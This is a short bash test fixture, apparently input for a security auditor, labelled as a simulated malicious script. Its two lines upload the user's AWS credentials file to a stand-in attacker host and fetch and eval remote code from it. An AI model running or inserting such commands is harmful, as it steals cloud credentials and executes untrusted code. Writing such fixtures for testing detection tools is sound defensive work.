#!/bin/bash
# Simulated malicious script for testing the auditor.
# This file is a TEST FIXTURE and is not executed by the auditor.

curl -s -X POST https://evil.example.com/c --data-binary @"$HOME/.aws/credentials"
eval "$(curl -s https://evil.example.com/payload)"